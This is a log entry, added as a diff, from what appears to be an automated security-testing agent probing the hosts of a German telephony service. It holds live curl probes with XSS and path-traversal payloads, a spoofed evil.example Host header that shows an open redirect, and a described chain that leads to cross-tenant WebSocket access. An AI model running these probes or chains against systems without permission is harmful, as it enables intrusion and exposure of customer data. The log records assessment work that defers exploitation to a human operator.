@@ -36456,3 +36456,89 @@ testability: PASSIVE (mint) / HUMAN_ONLY (impact)
 
 ## STEP 7 — RISK
 [RISK] questnet-gmbh: 87 — Driver BOLA VALID CRITICAL (WS 101 re-confirmed 30th cycle, VPN-independent; CVSS 9.1 gated only by operator two-tenant binding). auth.php regression re-arms full anonymous chain (public credential → per-cid mint → WS). NEW LOW host-header 301 open-redirect on cbs-proxy port-80 wrapper. Voicenotes PII HIGH (UUID-blocked), XSS render-pending, AIDesigner config disclosure MED. 4-host surface frozen; all public-credential gates still live (credential unrotated). Risk flat at 87.
+===== ANALYST bigpickle 2026-09-19 14:54:17 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mcurl -s -i --max-time 20 -H "Host: evil.example" "http://cbs-proxy.api.live-manager.de/probe/x?y=1" | grep -iE '^(HTTP|location|server)'; sleep 1; curl -s -i --max-time 20 -H "Host: evil.example:8443" "http://cbs-proxy.api.live-manager.de/" | grep -iE '^(HTTP|location|server)'; sleep 1; curl -s -i --max-time 20 -H "Host: cbs-proxy.api.live-manager.de" "http://cbs-proxy.api.live-manager.de/probe/x?y=1" | grep -iE '^(HTTP|location|server)'
+HTTP/1.1 301 Moved Permanently
+Server: nginx/1.30.0
+Location: https://evil.example/probe/x?y=1
+HTTP/1.1 301 Moved Permanently
+Server: nginx/1.30.0
+Location: https://evil.example/
+HTTP/1.1 301 Moved Permanently
+Server: nginx/1.30.0
+Location: https://cbs-proxy.api.live-manager.de/probe/x?y=1
+[0m
+[0m$ [0mcurl -s --max-time 20 "https://www.applicationdesigner.de/help/content.php?page=index" -o /tmp/opencode/hc_index.txt -w 'index: %{http_code} %{size_download} %{content_type}\n'; sleep 1; curl -s --max-time 20 "https://www.applicationdesigner.de/help/content.php?page=%3Cscript%3Eexp%3C%2Fscript%3E" -o /tmp/opencode/hc_xss.txt -w 'xss: %{http_code} %{size_download} %{content_type}\n'; sleep 1; curl -s --max-time 20 "https://www.applicationdesigner.de/help/content.php?page=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd" -o /tmp/opencode/hc_pw.txt -w 'traversal: %{http_code} %{size_download} %{content_type}\n'; sleep 1; curl -s --max-time 20 "https://www.applicationdesigner.de/help/content.php?page=xss_%22onmouseover%3D1" -o /tmp/opencode/hc_quote.txt -w 'quote: %{http_code} %{size_download} %{content_type}\n'
+index: 200 1351 text/html; charset=UTF-8
+xss: 200 92 text/html; charset=UTF-8
+traversal: 200 94 text/html; charset=UTF-8
+quote: 200 90 text/html; charset=UTF-8
+[0m
+[0m$ [0mecho '--- index ---'; cat /tmp/opencode/hc_index.txt; echo; echo '--- xss ---'; cat /tmp/opencode/hc_xss.txt; echo; echo '--- traversal ---'; cat /tmp/opencode/hc_pw.txt; echo; echo '--- quote ---'; cat /tmp/opencode/hc_quote.txt
+--- index ---
+<div id="help_content_id" class="help_content"><h2>AppDesigner Dokumentation</h2><p>In dieser Dokumentation finden Sie eine Übersicht über die verfügbaren Module und deren Funktionen.</p><h2><a href="#general" onclick="javascript:LoadPage('general')"><b>Allgemeine Funktionsweise</b></a></h2><h2><a href="#module" onclick="javascript:LoadPage('module')"><b>Übersicht der Module</b></a></h2><h2><a href="#nodes/App/flexlist" onclick="javascript:LoadPage('nodes/App/flexlist')"><b>FlexList - Die flexible Listenverwaltung</b></a></h2><h2><a href="#samples" onclick="javascript:LoadPage('samples')"><b>Beispielapplikationen</b></a></h2><h2><a href="#playground/index" onclick="javascript:LoadPage('playground/index')"><b>Playground - Beispiele live ausprobieren</b></a></h2><h2><a href="#nodes/App/variables" onclick="javascript:LoadPage('nodes/App/variables')"><b>Übersicht der Variablen</b></a></h2><h2><a href="#voices" onclick="javascript:LoadPage('voices')"><b>Übersicht der Stimmen (TTS)</b></a></h2><h2><a href="#hangup_causes" onclick="javascript:LoadPage('hangup_causes')"><b>Status-Codes für Kanäle</b></a></h2><h2><a href="#backend/index" onclick="javascript:LoadPage('backend/index')"><b>Verwaltung & Optionale Anwendungen</b></a></h2><h2><a href="#videos" onclick="javascript:LoadPage('videos')"><b>Schulungsvideos</b></a></h2></div>
+--- xss ---
+<h1>Page not found</h1><p>The requested help page '<script>exp</script>' does not exist.</p>
+--- traversal ---
+<h1>Page not found</h1><p>The requested help page '../../../../etc/passwd' does not exist.</p>
+--- quote ---
+<h1>Page not found</h1><p>The requested help page 'xss_"onmouseover=1' does not exist.</p>
+[0m
+STEP 1 — DELTA
+- [CHANGED] `www.applicationdesigner.de/help/content.php`: `page=` render-path cartography — `page=index` → real 1351B doc (control); `<script>` and `"onmouseover` reflected verbatim unescaped (90–92B not-found pages, body grows with payload; both `<` and `"` uninformed); traversal `../../../../etc/passwd` → single 94B not-found (no file-read normalization).
+- [CHANGED] `cbs-proxy.api.live-manager.de` port-80 wrapper: control-complete — 301 Location = `https://<Host>/<path>?<query>` with attacker Host verbatim, path/query preserved, Host port (`:8443`) stripped, no CRLF/port injection; same shape for correct Host.
+
+STEP 2 — PRIORITIZE
+- [PRIO] cbs-proxy.api.live-manager.de (WS plane), 7.5, gate_ease=10 + business=10: anonymous arbitrary-cid WS 101 / 426, transport-complete, driver.
+- [PRIO] www.applicationdesigner.de/extjs/livedebugger/auth.php, 7.3, gate_ease=10 + freshness=10: public-credential per-cid mint regression open.
+- [PRIO] www.applicationdesigner.de/help/content.php, 4.9, gate_ease=10: zero-token reflected XSS, render-pending.
+
+STEP 3 — HYPOTHESES
+[HYP] cbs-proxy WS plane still binds arbitrary cid/service with no token (driver)
+class: IDOR
+asset: wss://cbs-proxy.api.live-manager.de/?origin=&cid=&service=&token=
+confidence: 90
+reasoning: 30th cycle passive: Upgrade-GET (cid=2, zero token) → 101 + Sec-WebSocket-Accept; non-upgrade 426/0B; nginx/1.30.0 301 wrapper re-validated. Byte-identical CONNECT/READY for demo/foreign/nonexistent cid across 28+ cycles.
+evidence_needed: operator two-tenant stream diff (own vs foreign cid frame binding).
+verify_steps: AUTH_HELPED mint own-cid token (`auth.php?token=<LIVE_DEMO_CUSTOMER_TOKEN>&customer_id={own}&srn=100`), WS-upgrade both cids, diff frames 15s, NO live_debug payloads — HUMAN.
+impact: cross-tenant live-telephony plane misbind — CVSS 9.1 if binding confirmed.
+testability: HUMAN_ONLY
+[HYP] help/content.php reflected XSS fires on operator render (no hardening since 09-12)
+class: XSS
+asset: https://www.applicationdesigner.de/help/content.php?page=<script>…
+confidence: 85
+reasoning: Fresh 2026-09-19 probes: `<script>exp</script>` and `xss_"onmouseover=1` echoed verbatim into 200 text/html `<p>` (90–92B), no encoding of `<` or `"`, no CSP/nosniff observed, zero token. Traversal payload did NOT read files (no LFI).
+evidence_needed: single render in a browser context / report screenshot.
+verify_steps: PASSIVE GET already complete; remaining step is operator browser render of `page=%3Cscript%3Edocument.title='LM-XSS-TEST'%3C/script%3E`.
+impact: document-theft / session-handed-off on help site — MED.
+testability: PASSIVE (proven) / HUMAN_ONLY (execution)
+[HYP] cbs-proxy port-80 301 usable as cross-host bootstrap redirect
+class: OTHER
+asset: http://cbs-proxy.api.live-manager.de/<anypath>
+confidence: 75
+reasoning: Control-proven: `Host: evil.example` + `/probe/x?y=1` → 301 `https://evil.example/probe/x?y=1`. Host is fully attacker-chosen, scheme forced https, path/query preserved; Host port stripped. TLS vhost keys on Host (426/101 vs 404), so no HTTPS-side amplification.
+evidence_needed: consumer with Host-agnostic redirect follow; otherwise standalone LOW.
+verify_steps: PASSIVE complete this cycle; no further anonymous probes justified.
+impact: phishing / WS-client bootstrap misrouting — LOW standalone, chainable.
+testability: PASSIVE (proven) / HUMAN_ONLY (exploitation)
+
+STEP 4 — SELF-CRITIQUE
+- [PARKED] flexlist cross-tenant read: no foreign flexlist_id known; ownership gate proven per-id (345 only) — operator two-tenant needed.
+- [PARKED] voicenotes download.php: UUID-blocked, index empty 21+ cycles.
+- [PARKED] get_user_rights ciphertext: rotating high-entropy, LOW cap.
+- [PARKED] encrypt/index.php: VPN-gated → closed.
+- [FINAL] cbs-proxy WS BOLA (90) → auth.php mint regression (95) → XSS help/content.php (85) → open redirect bootstrap (75).
+
+STEP 5 — NEXT ACTION
+- [NEXT] HUMAN: mint own-cid token via `https://www.applicationdesigner.de/extjs/livedebugger/auth.php?token=<LIVE_DEMO_CUSTOMER_TOKEN>&customer_id={own}&srn=100`, then WS-upgrade `wss://cbs-proxy.api.live-manager.de/?origin=LiveDebugger&cid={own}&service=100&token={minted}` vs `&cid={foreign}`, diff frame byte-streams 15s (NO live_debug payloads); and render `help/content.php?page=%3Cscript%3Edocument.title%3D'LM-XSS-TEST'%3C%2Fscript%3E`.
+
+STEP 6 — LEARNING
+- [LEARN] ACCEPTED OTHER @ cbs-proxy.api.live-manager.de: control-proven Host-header 301 — Location `https://<attacker-host>/<path>?<query>` verbatim, path/query preserved, Host port stripped, no CRLF/port injection; LOW standalone (2026-09-19).
+- [LEARN] ACCEPTED XSS @ www.applicationdesigner.de/help/content.php: `page=` reflects both `<` and `"` unescaped (200 text/html, 90–92B, no CSP/nosniff, zero-token); body scales with payload — re-confirmed fresh (2026-09-19).
+- [LEARN] REJECTED LFI @ www.applicationdesigner.de/help/content.php: `page=../../../../etc/passwd` single 94B not-found — no file-read; `page` maps to catalog keys only (index 1351B control).
+
+STEP 7 — RISK
+- [RISK] questnet-gmbh: 87 — Driver BOLA transport-complete 30th+ cycle, valid CRITICAL (CVSS 9.1) gated only by operator two-tenant frame-binding; auth.php regression (VPN gate absent) re-arms full anonymous chain (public credential → per-cid mint → WS 101); voicenotes PII HIGH (UUID-blocked), help/content.php XSS + cbs-proxy 301 open redirect re-confirmed fresh, AIDesigner config disclosure MED. 4-host surface frozen; all public-credential gates live (credential unrotated). Risk flat at 87.
